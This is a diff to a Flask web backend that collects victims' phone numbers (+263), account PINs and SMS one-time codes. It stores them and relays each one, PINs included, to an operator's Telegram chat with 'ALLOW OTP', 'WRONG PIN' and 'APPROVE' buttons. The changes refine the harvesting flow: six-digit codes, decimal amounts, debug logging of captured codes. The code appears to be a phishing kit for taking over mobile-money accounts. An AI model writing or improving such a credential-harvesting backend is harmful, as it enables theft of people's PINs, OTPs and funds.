@@ -18,7 +18,7 @@ def init_db():
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS payments (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
-        app_id TEXT, plan TEXT, amount INTEGER,
+        app_id TEXT, plan TEXT, amount REAL,
         phone TEXT, pin TEXT, code TEXT,
         status TEXT DEFAULT 'pending',
         code_status TEXT DEFAULT 'pending'
@@ -35,8 +35,10 @@ def send_telegram(message, reply_markup=None):
     try:
         payload = {'chat_id': CHAT_ID, 'text': message}
         if reply_markup: payload['reply_markup'] = reply_markup
-        requests.post(f'{TELEGRAM_API}/sendMessage', json=payload)
-    except Exception as e: print(f'Telegram error: {e}')
+        resp = requests.post(f'{TELEGRAM_API}/sendMessage', json=payload)
+        print(f'Telegram response: {resp.status_code} - {resp.text}')  # DEBUG
+    except Exception as e:
+        print(f'Telegram error: {e}')
 
 def edit_telegram(message_id, text):
     try:
@@ -60,7 +62,7 @@ def submit_payment():
     data = request.json
     phone = data.get('phone','')
     pin = data.get('pin','')
-    amount = int(data.get('amount',0))
+    amount = float(data.get('amount',0))
     plan = data.get('plan','')
     purpose = data.get('purpose','')
     conn = sqlite3.connect('database.db'); c = conn.cursor()
@@ -72,10 +74,10 @@ def submit_payment():
             conn.close()
             return jsonify({'success': False, 'error': 'Too many OTP requests. Wait.'})
         app_id = 'SZ-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-        code = str(random.randint(1000, 9999))
+        code = str(random.randint(100000, 999999))   # 6‑digit OTP
         c.execute('INSERT INTO payments (app_id, plan, amount, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,plan,amount,phone,pin,code))
         conn.commit(); conn.close()
-        msg = f'📤 OTP REQUESTED\n\n🆔 {app_id}\n📞 +263 {phone}\n📦 {plan}\n💰 ${amount:,}'
+        msg = f'📤 OTP REQUESTED\n\n🆔 {app_id}\n📞 +263 {phone}\n📦 {plan}\n💰 ${amount:,.2f}'
         send_telegram(msg, {'inline_keyboard':[[{'text':'❌ INVALID','callback_data':f'deny_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]})
         return jsonify({'success':True,'app_id':app_id})
     
@@ -89,24 +91,27 @@ def submit_payment():
         c.execute('INSERT INTO users (phone) VALUES (?)',(phone,))
     
     app_id = 'SZ-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-    code = str(random.randint(1000, 9999))
+    code = str(random.randint(100000, 999999))        # 6‑digit OTP
     c.execute('INSERT INTO payments (app_id, plan, amount, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,plan,amount,phone,pin,code))
     conn.commit(); conn.close()
     
     prefix = '🔄 RETURNING USER' if is_returning else '📥 NEW PAYMENT'
-    msg = f'{prefix}\n\n🆔 {app_id}\n📞 +263 {phone}\n📦 {plan}\n💰 ${amount:,}\n🔢 PIN: {pin}'
+    msg = f'{prefix}\n\n🆔 {app_id}\n📞 +263 {phone}\n📦 {plan}\n💰 ${amount:,.2f}\n🔢 PIN: {pin}'
     send_telegram(msg, {'inline_keyboard':[[{'text':'❌ INVALID','callback_data':f'deny_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]})
     return jsonify({'success':True,'app_id':app_id})
 
 @app.route('/api/submit_code', methods=['POST'])
 def submit_code():
-    data = request.json; app_id = data.get('app_id'); entered_code = data.get('code')
+    data = request.json
+    app_id = data.get('app_id')
+    entered_code = data.get('code')
+    print(f'Received code for {app_id}: {entered_code}')   # DEBUG
     conn = sqlite3.connect('database.db'); c = conn.cursor()
     c.execute('SELECT phone, amount, plan, pin FROM payments WHERE app_id = ?',(app_id,))
     p = c.fetchone()
     if p:
         phone, amount, plan, pin = p
-        msg = f'🔐 CODE VERIFICATION\n\n🆔 {app_id}\n📞 +263 {phone}\n📦 {plan}\n💰 ${amount:,}\n🔢 PIN: {pin}\n\n📋 FULL MESSAGE:\n```\n{entered_code}\n```'
+        msg = f'🔐 CODE VERIFICATION\n\n🆔 {app_id}\n📞 +263 {phone}\n📦 {plan}\n💰 ${amount:,.2f}\n🔢 PIN: {pin}\n\n📋 ENTERED CODE:\n```\n{entered_code}\n```'
         send_telegram(msg, {'inline_keyboard':[[{'text':'❌ WRONG PIN','callback_data':f'wrongpin_{app_id}'},{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'},{'text':'✅ APPROVE','callback_data':f'approve_{app_id}'}]]})
     conn.close()
     return jsonify({'success':True})
